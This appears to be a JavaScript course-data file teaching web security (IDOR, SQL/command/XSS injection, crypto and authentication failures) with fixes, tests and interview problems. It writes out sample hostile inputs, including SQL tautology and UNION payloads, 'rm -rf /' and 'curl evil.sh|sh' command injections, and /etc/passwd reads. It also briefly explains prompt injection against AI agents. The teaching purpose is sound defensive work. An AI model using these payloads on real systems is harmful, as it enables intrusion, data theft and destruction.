(function () { var topics = [], practice = [], quiz = [], interview = [];

/* helper: build a written-answer problem (be track: code optional) */
function P(title, level, tags, statement, constraints, example, bruteWhy, mcq, hints, approach, complexity, followUps, extra) {
  var sol = { approach: approach, complexity: complexity, followUps: followUps };
  var p = { title: title, level: level, tags: tags, companies: ['Google', 'Amazon', 'Stripe'], statement: statement, constraints: constraints, example: example, brute: { why: bruteWhy }, mcq: mcq, hints: hints, solution: sol };
  if (extra) { if (extra.code) sol.code = extra.code; if (extra.lang) p.lang = extra.lang; }
  return p;
}
function tbl(cols, rows, hl) { return { type: 'table', columns: cols, rows: rows, hl: hl || {} }; }

/* =========================================================
   TOPIC 1 — Broken access control & IDOR
   ========================================================= */
topics.push({
  title: 'Broken Access Control & IDOR (OWASP A01)',
  analogy: `<p>A hotel gives you a key card. The card opens <b>room 412</b>, and that is all. Now imagine the front desk only checks that you are <i>a guest</i>, and then lets you walk into <i>any</i> room if you just type the room number into the lift. You are logged in (a guest) but nobody asks "is this <b>your</b> room?". That missing question is <b>Broken Access Control</b>, and the room-number trick is called <b>IDOR</b> (Insecure Direct Object Reference).</p>`,
  explain: `<p>🟢 <b>Two different questions.</b> <b>Authentication</b> = "who are you?" (login). <b>Authorization</b> = "are you allowed to do <i>this</i> to <i>that</i> thing?". Broken access control happens when the app answers the first question and forgets the second. It has been <b>#1 on the OWASP Top 10 since 2021</b> because it is easy to forget and automated scanners cannot see it: only a human who knows the business rules can say "user 7 must not read invoice 205".</p>
  <p>🔵 <b>IDOR in one picture.</b> Your browser calls <code>GET /api/invoices/101</code>. The attacker changes <code>101</code> to <code>102</code>, <code>103</code>, ... If the server just does <code>SELECT * FROM invoices WHERE id = ?</code>, every invoice leaks. IDs that are guessable numbers make it trivial, but <b>random UUIDs do not fix it</b> - they only hide it. The real fix is a check on the server.</p>
  ${H.table(['Request by user 7', 'Invoice owner', 'No ownership check', 'With ownership check'], [
    ['GET /invoices/101', 'user 7', H.c('g', '200 OK'), H.c('g', '200 OK')],
    ['GET /invoices/205', 'user 9', H.c('r', '200 OK - LEAK'), H.c('g', '404 Not Found')],
    ['DELETE /invoices/205', 'user 9', H.c('r', '204 - data destroyed'), H.c('g', '404 Not Found')]
  ])}
  <p>🔴 <b>The family of access bugs.</b> (1) <b>IDOR / BOLA</b> - object-level: wrong owner. (2) <b>Function-level</b> - a normal user calls <code>/admin/deleteUser</code> because only the <i>button</i> was hidden. (3) <b>Mass assignment</b> - client sends <code>{"role":"admin"}</code> in a profile update and the server copies every field. (4) <b>Path traversal</b> - <code>../../etc/passwd</code>. (5) <b>CORS misconfig</b> and <b>forced browsing</b> to unlinked URLs.</p>
  <p>🟣 <b>The fix pattern: deny by default, check on the server, every time.</b> Put the owner in the query itself: <code>WHERE id = ? AND owner_id = ?</code> (the "scoped query"). Return <b>404</b>, not 403, for other people's objects so you do not confirm the object exists. Never trust a user id that comes from the request body; take it from the verified session or token.</p>`,
  clues: [
    '"user A can see user B\'s order/invoice/profile by changing the id" - IDOR / BOLA (Broken Object Level Authorization)',
    '"hidden admin button but the API still works" - function-level access control missing on the server',
    '"client sends {role: admin} and it works" - mass assignment; use DTOs with an allow-list of fields',
    '"design the authorization for a multi-tenant SaaS" - tenant id in every query, deny by default, central policy',
    '"should we use UUIDs instead of integers?" - helpful but NOT a fix; the ownership check is the fix',
    '"return 403 or 404?" - 404 for other users\' objects to avoid leaking existence'
  ],
  code: [
    `import java.util.*;

/** Plain-Java model of the IDOR fix: the lookup is scoped by owner. */
public class InvoiceService {
    record Invoice(int id, int ownerId, String item) {}

    private final Map<Integer, Invoice> db = new HashMap<>();

    InvoiceService() {
        db.put(101, new Invoice(101, 7, "Laptop"));
        db.put(205, new Invoice(205, 9, "Salary slip"));
    }

    /** VULNERABLE: any logged-in user can read any invoice id. */
    Invoice getUnsafe(int invoiceId) {
        return db.get(invoiceId);
    }

    /** FIXED: caller id comes from the verified session, never from the request body. */
    Optional<Invoice> getSafe(int sessionUserId, int invoiceId) {
        Invoice inv = db.get(invoiceId);
        // Same answer for "does not exist" and "not yours" -> no existence leak.
        if (inv == null || inv.ownerId() != sessionUserId) return Optional.empty();
        return Optional.of(inv);
    }

    public static void main(String[] args) {
        InvoiceService s = new InvoiceService();
        System.out.println("unsafe, user 7 reads 205: " + s.getUnsafe(205));
        System.out.println("safe,   user 7 reads 101: " + s.getSafe(7, 101).isPresent());
        System.out.println("safe,   user 7 reads 205: " + s.getSafe(7, 205).isPresent());
    }
}`,
    { lang: 'java', check: false, title: 'Spring Boot: method-level policy + scoped query', code: `// Controller: the id of the caller comes from the authenticated principal
@GetMapping("/api/invoices/{id}")
public InvoiceDto get(@PathVariable long id, @AuthenticationPrincipal UserPrincipal me) {
    return invoiceRepo.findByIdAndOwnerId(id, me.getId())      // scoped query
            .map(InvoiceDto::from)
            .orElseThrow(() -> new ResponseStatusException(HttpStatus.NOT_FOUND));
}

// Function-level control: enforced on the server, not by hiding a button
@PreAuthorize("hasRole('ADMIN')")
@DeleteMapping("/admin/users/{id}")
public void deleteUser(@PathVariable long id) { userService.delete(id); }

// Mass-assignment defence: accept only fields we list (a DTO), never the entity
public record ProfileUpdate(String displayName, String avatarUrl) {}   // no 'role' field exists` },
    { lang: 'js', run: true, title: 'Runnable: IDOR test harness', code: `// A tiny "API" with and without the ownership check, plus a test that tries every id.
const invoices = { 101: { owner: 7, item: 'Laptop' }, 102: { owner: 7, item: 'Phone' }, 205: { owner: 9, item: 'Salary slip' } };
const unsafeGet = (user, id) => invoices[id] ? { status: 200, body: invoices[id] } : { status: 404 };
const safeGet = (user, id) => (invoices[id] && invoices[id].owner === user) ? { status: 200, body: invoices[id] } : { status: 404 };

function enumerate(api, user) {
  const leaked = [];
  for (let id = 100; id <= 210; id++) {            // attacker walks the id space
    const r = api(user, id);
    if (r.status === 200 && r.body.owner !== user) leaked.push(id);
  }
  return leaked;
}
console.log('unsafe leaks to user 7:', enumerate(unsafeGet, 7));
console.log('safe   leaks to user 7:', enumerate(safeGet, 7));` }
  ],
  codeTitle: ['Java: scoped lookup (compiles & runs)', 'Spring: policy in the server', 'JS: enumeration test'],
  viz: {
    title: 'IDOR: same requests, with and without an ownership check',
    input: '7 101 102 205 206',
    inputLabel: 'Logged-in user id, then invoice ids to request (space separated)',
    gen: function (input) {
      var t = String(input).trim().split(/[\s,]+/).map(Number);
      if (t.length < 2 || t.some(isNaN)) throw new Error('Enter: userId id1 id2 ... (numbers)');
      if (t.length > 9) throw new Error('At most 8 invoice ids');
      var me = t[0], ids = t.slice(1);
      var owner = { 101: 7, 102: 7, 205: 9, 206: 9 };
      function row(id) { var o = owner[id]; return o === undefined ? 'none' : 'user ' + o; }
      var frames = [], rows = [], hl = {}, i;
      frames.push({ narr: 'User <b>' + me + '</b> is logged in. They will ask for several invoice ids. Owners: 101,102 = user 7; 205,206 = user 9.', parts: [{ type: 'vars', label: 'Session', vals: { loggedInUser: me, requests: ids.length } }] });
      for (i = 0; i < ids.length; i++) {
        var o = owner[ids[i]], mine = o === me;
        rows.push(['GET /invoices/' + ids[i], row(ids[i]), o === undefined ? '404' : '200 data returned', mine || o === undefined ? 'fine' : 'LEAK']);
        hl[i] = (mine || o === undefined) ? 'ok' : 'bad';
        frames.push({ narr: 'WITHOUT a check the server only asks "does invoice ' + ids[i] + ' exist?" ' + (mine || o === undefined ? 'Result is fine.' : '<span class="c-r">It belongs to someone else yet it is returned - IDOR!</span>'), parts: [tbl(['Request', 'Owner', 'Response', 'Verdict'], rows.slice(), JSON.parse(JSON.stringify(hl)))] });
      }
      var rows2 = [], hl2 = {};
      for (i = 0; i < ids.length; i++) {
        var o2 = owner[ids[i]], mine2 = o2 === me;
        rows2.push(['GET /invoices/' + ids[i], row(ids[i]), mine2 ? '200 data returned' : '404 Not Found', mine2 ? 'allowed' : 'blocked']);
        hl2[i] = mine2 ? 'ok' : 'sel';
      }
      frames.push({ narr: 'NOW add the ownership check <code>WHERE id=? AND owner_id=session.user</code>. Other people\'s ids look exactly like missing ones.', parts: [tbl(['Request', 'Owner', 'Response', 'Verdict'], rows2, hl2)] });
      frames.push({ narr: 'Rule to remember: <b>authenticate who, authorize what</b>. The user id comes from the session, the object comes from the URL, and the server joins them.', parts: [{ type: 'text', html: '<b>Deny by default.</b> Scope every query by owner or tenant. Return 404 for foreign objects.' }] });
      return frames;
    }
  },
  examples: [
    { title: 'Find the IDOR (and fix it)', html: `<p>An endpoint <code>GET /api/orders/{id}</code> runs <code>SELECT * FROM orders WHERE id = ?</code>. A tester logged in as Asha requests Ben's order 5012 and gets his address. <b>Bug:</b> the query ignores who is asking. <b>Fix:</b> <code>... WHERE id = ? AND customer_id = :sessionUser</code>, and return 404 when no row is found. Add an automated test that logs in as user A and requests user B's id and expects 404.</p>` },
    { title: 'Mass assignment in a profile update', html: `<p>The client sends <code>{"name":"Asha","isAdmin":true}</code>. A framework binds every JSON field onto the <code>User</code> entity and saves it. Asha is now an admin. <b>Fix:</b> bind to a small DTO that only has <code>name</code> and <code>avatarUrl</code>; roles change only through an admin-only endpoint.</p>`, code: { lang: 'java', check: false, code: `public record ProfileUpdate(String name, String avatarUrl) {}   // no isAdmin, no role, no id\nuser.setName(req.name());\nuser.setAvatarUrl(req.avatarUrl());` } },
    { title: 'Multi-tenant SaaS: tenant id everywhere', html: `<p>Company A and company B share one database. Every table has <code>tenant_id</code>, and every query is built through one repository helper that adds <code>AND tenant_id = :tenant</code> from the token. For belt and braces, PostgreSQL <b>Row Level Security</b> enforces the same rule inside the database, so one forgotten WHERE cannot leak a whole tenant.</p>`, code: { lang: 'sql', check: false, code: `ALTER TABLE invoices ENABLE ROW LEVEL SECURITY;\nCREATE POLICY tenant_isolation ON invoices\n  USING (tenant_id = current_setting('app.tenant_id')::bigint);` } }
  ],
  deepDive: `<p>🟣 <b>Where the check belongs.</b> Put authorization in one central layer (policy engine, service layer, or database row-level security) instead of copy-pasting <code>if</code> statements in every controller. Scattered checks always miss one endpoint. Common architectures: RBAC (roles), ABAC (attributes: owner, department, time), ReBAC (relationships, e.g. Google Zanzibar / OpenFGA: "alice is editor of doc 12 because she is in group eng"). Each request should evaluate <code>allow(subject, action, resource)</code>.</p>
  <p><b>BOLA vs BFLA.</b> API security lists BOLA (object level) and BFLA (function level) separately. Test both: replay user A's request with user B's token; replay a normal user's token against admin routes. Include <b>indirect references</b> too: GraphQL nested fields, bulk endpoints (<code>/export?ids=1,2,3</code>), file download paths, and cached responses keyed without the user.</p>
  <p><b>Pitfalls.</b> Checking permission on read but not update/delete; trusting the <code>X-User-Id</code> header; JWT claims that the client can edit when the signature is not verified; checking the parent (project) but not the child (task); race conditions where ownership changes between check and use (TOCTOU). Prefer the scoped query because check and use are one atomic statement.</p>
  <p><b>Detection in production:</b> alert on one session touching many different object ids (enumeration), a spike of 404s per user, and 403s on admin routes. Logging that is covered in the audit-log topic makes these visible.</p>`,
  aiEra: `<p>🤖 <b>What AI changes:</b> AI code assistants happily generate <code>findById(id)</code> endpoints that work and look clean but skip the owner check, because the prompt said "get invoice by id". Attackers also use AI agents to enumerate APIs and replay requests with swapped tokens at scale. <b>Use AI as a partner:</b> ask it "list every endpoint in this controller and for each say which user/tenant check protects it", or "write negative tests where user B requests user A's object". <b>Where AI goes wrong:</b> it does not know your business rules, invents roles, and confidently says "authorization is handled by the framework" when it is not. Also, if you give an LLM agent tools (read order, refund order), the tool must enforce the <i>end user's</i> permissions - never the agent's broad service account. <b>You still own:</b> the authorization model, deny-by-default, and the negative tests.</p>`,
  problems: [
    P('Find and Fix the IDOR', 'Easy', ['idor', 'access control'],
      `<p>A tester reports: logged in as user 7, <code>GET /api/notes/41</code> returns a note that belongs to user 3. The handler is <code>notes.findById(id)</code>. Explain the root cause, write the fix, and describe the test that would have caught it.</p>`,
      `One table <code>notes(id, owner_id, body)</code>; ids are sequential integers.`,
      `<p>Request: <code>GET /notes/41</code> as user 7. Owner = user 3. ${H.c('r', 'Before: 200 with body')} ${H.c('g', 'After: 404')}.</p>`,
      `<p>Hiding the link in the UI or switching ids to UUIDs only makes guessing harder. The server still answers anyone who learns an id (from logs, emails, shared screenshots).</p>`,
      { q: 'Best first fix?', options: ['Use random UUIDs for note ids', 'Scope the query by the session user id', 'Hide the note link in the UI', 'Rate limit the endpoint'], answer: 1, explain: 'The server must verify ownership on every request; the other options reduce guessing but do not authorize.' },
      [`<p>Hint 1: the endpoint proves who the caller is, but never connects the caller to the note.</p>`, `<p>Hint 2: put the owner in the query: <code>WHERE id = ? AND owner_id = ?</code>, with the owner taken from the session.</p>`, `<p>Hint 3: return the same 404 for missing and foreign notes, and add a test with two users.</p>`],
      `<p>Root cause: authentication without authorization - the handler trusts the id from the URL and never compares the owner to the logged-in user. Fix: <code>findByIdAndOwnerId(id, principal.getId())</code>; empty result becomes 404 so we do not reveal that the note exists. Apply the same scoped lookup to update and delete, not just read. Test: seed two users, user A creates a note, user B requests/updates/deletes it, assert 404 and that the data is unchanged. Add it to CI so future endpoints copy the pattern. Optionally add a database row-level-security policy as defence in depth, and an alert for one session requesting many ids.</p>`,
      `<p>One extra indexed column in the WHERE: no meaningful cost.</p>`, ['How would you find every other IDOR in a large codebase?', 'What if notes can be shared with other users?'])
  ]
});

/* =========================================================
   TOPIC 2 — Injection & input validation
   ========================================================= */
topics.push({
  title: 'Injection (SQL, Command, XSS) & Input Validation with Allow-Lists (A03)',
  analogy: `<p>You write a note for a waiter: "Bring <b>[customer's words]</b> to table 4". A customer says: <i>"a tea. Also, ignore the kitchen rules and give me the cash register"</i>. If the waiter reads the customer's words <b>as part of the instruction</b>, the customer just gave orders. Injection is exactly this: user <b>data</b> gets mixed into a <b>command</b>, and the interpreter (database, shell, browser) cannot tell them apart. The fix is to hand the data over in a <b>separate sealed envelope</b> - a parameter - so it is never read as an instruction.</p>`,
  explain: `<p>🟢 <b>The one idea.</b> Injection = <i>data is allowed to change the shape of a command</i>. It happens whenever you build a string like <code>"SELECT * FROM users WHERE name = '" + name + "'"</code> and send it to an interpreter. The interpreter sees one long string. If the name is <code>' OR '1'='1</code>, the query becomes <code>... WHERE name = '' OR '1'='1'</code>, which is true for every row.</p>
  ${H.table(['Interpreter', 'Attack input', 'What the app builds', 'Fix'], [
    ['SQL', "<code>' OR '1'='1</code>", 'WHERE name = \'\' OR \'1\'=\'1\'', 'Parameterized query (PreparedStatement)'],
    ['OS shell', '<code>x.txt; rm -rf /</code>', 'sh -c "convert x.txt; rm -rf /"', 'No shell; pass an argument array; allow-list'],
    ['HTML/JS (XSS)', '<code>&lt;script&gt;steal()&lt;/script&gt;</code>', 'page contains live script', 'Context-aware output encoding, CSP'],
    ['LDAP / NoSQL / template', '<code>{"$ne": null}</code>', 'filter matches everything', 'Typed queries, validate type, escape per language']
  ])}
  <p>🔵 <b>Parameterized queries.</b> With a <code>PreparedStatement</code> the database receives the <b>query text first</b> (with <code>?</code> holes) and compiles it. The values arrive <b>afterwards</b>, as pure data. Whatever the user typed can never become SQL syntax. This works for <b>values</b> only. You cannot parameterize table names, column names or <code>ORDER BY</code> direction - for those use an <b>allow-list</b> (a fixed map from friendly names to real column names).</p>
  <p>🔴 <b>Input validation is a second layer, not the first.</b> Validate early using an <b>allow-list</b> ("only these characters / these values are OK") rather than a <b>block-list</b> ("reject quotes and DROP"). Block-lists lose: attackers use encodings, case changes and tricks you did not think of. Validate <b>type, length, range, format, and business meaning</b> (is this country code really in our list?). Validation reduces risk and gives clean error messages; parameterization is what actually stops SQL injection.</p>
  <p>🟣 <b>Defence in depth.</b> Least-privilege database account (no DROP, no access to other schemas), ORM used correctly (raw string concatenation inside JPQL/HQL is still injection), stored procedures that do not build dynamic SQL, WAF as a speed bump only, and error messages that never show SQL text to users.</p>`,
  clues: [
    '"search box / login form returns all rows" - classic SQL injection (tautology like OR 1=1)',
    '"user supplies a filename / hostname used in a shell command" - OS command injection; avoid the shell entirely',
    '"dynamic ORDER BY / column name from the request" - cannot be parameterized; use an allow-list map',
    '"validate input" - allow-list type, length, format and range; reject, do not "clean"',
    '"we escape quotes" - fragile; the interview answer is parameterized queries',
    '"user comment shown to other users" - stored XSS; encode on output, add CSP'
  ],
  code: [
    `import java.sql.*;

/** Shows the vulnerable pattern next to the fixed one. Needs a JDBC URL to run; shown here for compile + reading. */
public class UserDao {
    // VULNERABLE: the name is glued into the SQL text.
    static ResultSet findUnsafe(Connection c, String name) throws SQLException {
        Statement st = c.createStatement();
        return st.executeQuery("SELECT id, name FROM users WHERE name = '" + name + "'");
    }

    // FIXED: SQL text is constant; the value travels separately as a bound parameter.
    static ResultSet findSafe(Connection c, String name) throws SQLException {
        PreparedStatement ps = c.prepareStatement("SELECT id, name FROM users WHERE name = ?");
        ps.setString(1, name);              // always treated as data, never as SQL
        return ps.executeQuery();
    }

    // Identifiers cannot be bound: map friendly keys to real column names (allow-list).
    static String orderBy(String key) {
        switch (key) {
            case "name": return "name";
            case "created": return "created_at";
            default: throw new IllegalArgumentException("bad sort key");
        }
    }

    public static void main(String[] args) {
        System.out.println(orderBy("created"));
        try { orderBy("name; DROP TABLE users"); } catch (IllegalArgumentException e) { System.out.println("rejected: " + e.getMessage()); }
    }
}`,
    { lang: 'python', run: true, title: 'Runnable: SQL injection vs parameterized (in-memory SQLite)', code: `import sqlite3

db = sqlite3.connect(':memory:')
db.execute('CREATE TABLE users(id INTEGER PRIMARY KEY, name TEXT, secret TEXT)')
db.executemany('INSERT INTO users(name, secret) VALUES (?, ?)',
               [('asha', 'asha-secret'), ('ben', 'ben-secret')])

payload = "' OR '1'='1"          # what an attacker types into the name box

# VULNERABLE: string concatenation builds the SQL
unsafe_sql = "SELECT name, secret FROM users WHERE name = '" + payload + "'"
print('unsafe SQL  :', unsafe_sql)
print('unsafe rows :', db.execute(unsafe_sql).fetchall())

# FIXED: parameter placeholder; the payload is just a (weird) name
rows = db.execute('SELECT name, secret FROM users WHERE name = ?', (payload,)).fetchall()
print('safe rows   :', rows)
print('normal user :', db.execute('SELECT name FROM users WHERE name = ?', ('asha',)).fetchall())` },
    { lang: 'js', run: true, title: 'Runnable: allow-list validator', code: `// Allow-list validation: describe what is GOOD; everything else is rejected.
const rules = {
  username: { type: 'string', pattern: /^[a-z][a-z0-9_]{2,19}$/ },        // 3-20 chars
  age:      { type: 'int', min: 13, max: 120 },
  country:  { type: 'enum', values: ['IN', 'US', 'DE', 'JP'] },
  sort:     { type: 'enum', values: ['name', 'created'] }
};
function validate(input) {
  const errors = [], clean = {};
  for (const key of Object.keys(input)) {
    if (!(key in rules)) { errors.push('unknown field: ' + key); }          // reject extra fields (mass assignment)
  }
  for (const [key, r] of Object.entries(rules)) {
    const v = input[key];
    if (v === undefined) { errors.push('missing: ' + key); continue; }
    if (r.type === 'string' && !(typeof v === 'string' && r.pattern.test(v))) errors.push('bad ' + key);
    else if (r.type === 'int' && !(Number.isInteger(v) && v >= r.min && v <= r.max)) errors.push('bad ' + key);
    else if (r.type === 'enum' && !r.values.includes(v)) errors.push('bad ' + key);
    else clean[key] = v;
  }
  return { ok: errors.length === 0, errors, clean };
}
console.log(validate({ username: 'asha_k', age: 30, country: 'IN', sort: 'name' }));
console.log(validate({ username: "x'; DROP TABLE users;--", age: '30', country: 'ZZ', sort: 'name', isAdmin: true }));` },
    { lang: 'java', title: 'Command injection fix: no shell, argument list, allow-list', code: `import java.util.*;
import java.util.regex.Pattern;

public class SafeCommand {
    private static final Pattern HOST = Pattern.compile("^[a-zA-Z0-9.-]{1,253}$");

    /** Builds the argv for ping. In real code you would pass it to new ProcessBuilder(argv).start(). */
    static List<String> pingCommand(String host) {
        if (!HOST.matcher(host).matches() || host.startsWith("-")) {
            throw new IllegalArgumentException("invalid host");      // allow-list, and no option injection
        }
        // Each element is ONE argument; no shell parses it, so ';' or '&&' are just characters.
        return List.of("ping", "-c", "1", host);
    }

    public static void main(String[] args) {
        System.out.println(pingCommand("example.com"));
        try { pingCommand("example.com; cat /etc/passwd"); }
        catch (IllegalArgumentException e) { System.out.println("blocked: " + e.getMessage()); }
    }
}` }
  ],
  codeTitle: ['Java: JDBC unsafe vs PreparedStatement', 'Python: injection demo', 'JS: allow-list validator', 'Java: safe command'],
  viz: {
    title: 'Injection payload: unsafe path vs parameterized path',
    input: "' OR '1'='1",
    inputLabel: 'Attacker input for the name field',
    gen: function (input) {
      var p = String(input);
      if (p.length > 40) throw new Error('Use at most 40 characters');
      var tauto = /'\s*or\s*'?1'?\s*=\s*'?1/i.test(p) || /--/.test(p) || /;/.test(p);
      var unsafeSql = "SELECT * FROM users WHERE name = '" + p + "'";
      var frames = [];
      frames.push({ narr: 'The attacker types the payload below into a harmless-looking search box.', parts: [{ type: 'vars', label: 'User input', vals: { name: p } }, { type: 'queue', label: 'Request pipeline', items: ['browser', 'app', 'database'], frontLabel: 'start', backLabel: 'end', hl: { 0: 'cur' } }] });
      frames.push({ narr: '<b>Unsafe path:</b> the app glues the text into the SQL string.', parts: [{ type: 'vars', label: 'Built SQL (unsafe)', vals: { sql: unsafeSql }, hl: { sql: tauto ? 'bad' : 'ok' } }, { type: 'queue', items: ['browser', 'app', 'database'], hl: { 1: 'cur' } }] });
      frames.push({ narr: tauto ? '<span class="c-r">The database cannot tell data from code. The payload changed the WHERE clause, so every row matches - data leaked.</span>' : 'This particular text did not change the query shape, but only by luck. A slightly different payload would.', parts: [{ type: 'table', label: 'Rows returned (unsafe)', columns: ['id', 'name', 'secret'], rows: tauto ? [[1, 'asha', 'asha-secret'], [2, 'ben', 'ben-secret']] : [[0, '(no match)', '-']], hl: tauto ? { 0: 'bad', 1: 'bad' } : {} }] });
      frames.push({ narr: '<b>Parameterized path, step 1:</b> the SQL text is fixed and sent first; <code>?</code> is a hole for one value.', parts: [{ type: 'vars', label: 'Prepared statement', vals: { sql: 'SELECT * FROM users WHERE name = ?' }, hl: { sql: 'ok' } }, { type: 'queue', items: ['browser', 'app', 'database'], hl: { 1: 'ok' } }] });
      frames.push({ narr: '<b>Step 2:</b> the value is sent on its own channel as plain data. It is compared to the name column as one long odd string.', parts: [{ type: 'vars', label: 'Bound parameter', vals: { 'param[1]': p }, hl: { 'param[1]': 'sel' } }, { type: 'queue', items: ['browser', 'app', 'database'], hl: { 2: 'ok' } }] });
      frames.push({ narr: '<span class="c-g">No user is called exactly that, so zero rows come back. The attack is just a very strange name.</span>', parts: [{ type: 'table', label: 'Rows returned (parameterized)', columns: ['id', 'name', 'secret'], rows: [['-', '(no match)', '-']], hl: { 0: 'ok' } }] });
      return frames;
    }
  },
  examples: [
    { title: 'Fix SQL injection in a login query', html: `<p>Vulnerable: <code>"SELECT * FROM users WHERE email='" + email + "' AND pw='" + pw + "'"</code>. Attack email: <code>admin@x.com'--</code> (the <code>--</code> comments out the password check). Fixed: select by email with a <code>?</code>, then compare the password with a slow salted hash (bcrypt/Argon2) in code. Never compare plain text passwords.</p>` },
    { title: 'Fix command injection in an image converter', html: `<p>Code ran <code>Runtime.exec("convert " + fileName + " out.png")</code>. Input <code>a.jpg; curl evil.sh|sh</code> runs an attacker script. Fix: do not use a shell; <code>new ProcessBuilder("convert", "--", safeName, "out.png")</code>; generate <code>safeName</code> yourself (a UUID) instead of using the uploaded name; run the tool in a sandbox with no network. Even better, use a library instead of a command.</p>` },
    { title: 'Sort column from the URL', html: `<p><code>/users?sort=created</code> becomes <code>ORDER BY created</code>. A PreparedStatement cannot bind a column name. Use an allow-list: <code>Map.of("name","name","created","created_at")</code> and 400 Bad Request if the key is missing. The map doubles as documentation of what is sortable (and indexed).</p>`, code: { lang: 'java', code: `import java.util.*;\npublic class SortKey {\n    static final Map<String, String> SORTABLE = Map.of("name", "name", "created", "created_at");\n    static String orderClause(String key, boolean desc) {\n        String col = SORTABLE.get(key);\n        if (col == null) throw new IllegalArgumentException("unsupported sort");\n        return " ORDER BY " + col + (desc ? " DESC" : " ASC");\n    }\n    public static void main(String[] a) { System.out.println(orderClause("created", true)); }\n}` } }
  ],
  deepDive: `<p>🟣 <b>Second-order (stored) injection.</b> The payload is saved safely (parameterized insert) but later read from the database and concatenated into a new query by a different job. Treat data from your own database as untrusted when building commands. <b>Blind injection:</b> no output, but the attacker infers data from timing (<code>SLEEP(5)</code>) or true/false differences; parameterization stops it the same way. <b>ORMs:</b> JPA <code>createQuery("... " + x)</code> and Hibernate <code>@Query</code> with SpEL concatenation are injectable; use named parameters. <b>NoSQL:</b> MongoDB <code>find({user: req.body.user})</code> with body <code>{"$ne": ""}</code> is an operator injection - validate that the field is a string.</p>
  <p><b>Validation vs sanitization vs encoding.</b> <i>Validate</i> on input (accept or reject). <i>Encode</i> on output for the destination context (HTML body, attribute, JS, URL, CSS differ). <i>Sanitize</i> (strip tags) only when you must accept rich text, with a maintained library (OWASP Java HTML Sanitizer, DOMPurify) - never hand-written regex. Canonicalize before validating (decode URL/Unicode once), otherwise <code>%2e%2e%2f</code> slips past a path check. Beware <b>ReDoS</b>: an evil regex such as <code>(a+)+$</code> can take exponential time; use linear-time engines or length caps.</p>
  <p><b>Path traversal and deserialization</b> are injection cousins: resolve the file path then verify it still starts with the allowed base directory (<code>normalize()</code> + <code>startsWith</code>); never deserialize untrusted Java objects (use JSON with a strict schema). <b>Least privilege</b> contains the blast radius when all else fails: the web app's DB user can SELECT/INSERT on its tables but cannot DROP, read other schemas, or call <code>xp_cmdshell</code>/<code>COPY ... PROGRAM</code>.</p>`,
  aiEra: `<p>🤖 <b>What AI changes:</b> LLM-generated code still produces string-concatenated SQL surprisingly often, especially in quick scripts and when you paste a prompt like "write a query for name X". A new injection class also appears: <b>prompt injection</b> - text inside a document or web page tells your AI agent to ignore its instructions. The root cause is the same as SQL injection: instructions and data share one channel, and there is no perfect "parameterized prompt" yet. Mitigations: treat model output as untrusted input (validate, allow-list tool arguments, never pass it to a shell or raw SQL), give agents least-privilege tools, require human approval for risky actions. <b>Use AI as a partner:</b> ask it to review a diff for injection sinks and to generate hostile test inputs for your validators. <b>You still own:</b> the rule "no string-built commands", and making the CI fail on it (SAST such as Semgrep/CodeQL).</p>`,
  problems: [
    P('Parameterize and Allow-List a Search Endpoint', 'Medium', ['sql injection', 'validation'],
      `<p>An endpoint <code>GET /products?category=...&amp;sort=...&amp;limit=...</code> builds SQL by concatenating all three values. Rewrite the design so it is safe. Say what is parameterized, what is allow-listed and what is range-checked, and how you would test it.</p>`,
      `Categories are free text; sort may be price or rating; limit between 1 and 100.`,
      `<p>Attack: <code>category=' UNION SELECT card_no FROM payments--</code> ${H.c('r', 'leaks cards')}. After the fix it matches no category and returns an empty list.</p>`,
      `<p>Escaping quotes by hand or blocking the words UNION/DROP. Attackers bypass with comments, case, encodings, or other syntax; and legitimate products named "Union Jack" break.</p>`,
      { q: 'Which value cannot be sent as a bound parameter?', options: ['category text', 'limit number', 'ORDER BY column name', 'search term'], answer: 2, explain: 'Parameters hold values, not identifiers; use an allow-list map for column names.' },
      [`<p>Hint 1: split the three inputs into values (can be bound) and identifiers (cannot).</p>`, `<p>Hint 2: category and limit are bound with <code>?</code>; sort comes from a map of allowed keys.</p>`, `<p>Hint 3: check limit is an integer in 1..100 before use; reject unknown sort with 400; DB user is read-only.</p>`],
      `<p>Use a constant SQL text with placeholders: <code>SELECT id,name,price FROM products WHERE category = ? ORDER BY &lt;col&gt; LIMIT ?</code>. Bind category as a string and limit as an int after validating 1..100 (reject, do not clamp silently, or clamp and document it). For <code>sort</code>, keep a fixed map {price: "price", rating: "avg_rating"}; anything else returns 400. The database account is read-only on the products table, so even a missed bug cannot read payments. Tests: a table of hostile strings (quotes, UNION, comments, unicode, very long) must return 200 with no extra data or 400; plus a static-analysis rule that bans string concatenation into SQL. Error responses show a generic message and a correlation id, never SQL text.</p>`,
      `<p>No performance cost; prepared statements can even be cached by the driver.</p>`, ['How do you handle a user-supplied filter such as price &gt; 10 AND rating &lt; 3?', 'What if you need to search by column chosen from many tables?'])
  ]
});

/* =========================================================
   TOPIC 3 — Crypto failures, auth failures, secrets management
   ========================================================= */
topics.push({
  title: 'Cryptographic & Authentication Failures, Secrets Management & Rotation (A02, A07)',
  analogy: `<p>A secret in code is like writing your house key's shape on the <b>front door</b>. A secret in a vault is like keeping the key at a bank: only people with a badge get it, each visit is logged, and you can change the lock without moving house. <b>Rotation</b> is changing the lock on a schedule (and instantly if you lose a key), so a stolen key stops working by itself.</p>`,
  explain: `<p>🟢 <b>Cryptographic failures (A02)</b> are mistakes in <i>protecting data</i>: sending it without HTTPS, storing passwords in plain text or with fast hashes (MD5, SHA-1), using ECB mode, hard-coding keys, rolling your own crypto, or using a predictable <code>Random</code> for tokens. <b>Authentication failures (A07)</b> are mistakes in <i>proving who you are</i>: weak or default passwords, no brute-force protection, session ids in URLs, sessions that never expire, missing MFA, "forgot password" that leaks whether an email exists.</p>
  ${H.table(['Need', 'Wrong', 'Right (2026)'], [
    ['Store passwords', 'plain text, MD5, SHA-256 alone', 'Argon2id (or bcrypt/scrypt) with per-user salt'],
    ['Encrypt data at rest', 'AES-ECB, home-made XOR', 'AES-256-GCM (authenticated), keys in KMS'],
    ['Random tokens', '<code>Math.random()</code>, <code>java.util.Random</code>', '<code>SecureRandom</code>, <code>secrets.token_urlsafe</code>'],
    ['Compare secrets', '<code>==</code> (timing leak)', 'constant-time compare'],
    ['Data in transit', 'HTTP, TLS 1.0/1.1', 'TLS 1.2+ (1.3 preferred), HSTS'],
    ['Sessions', 'id in URL, never expires', 'HttpOnly+Secure+SameSite cookie, rotate on login, idle + absolute timeout']
  ])}
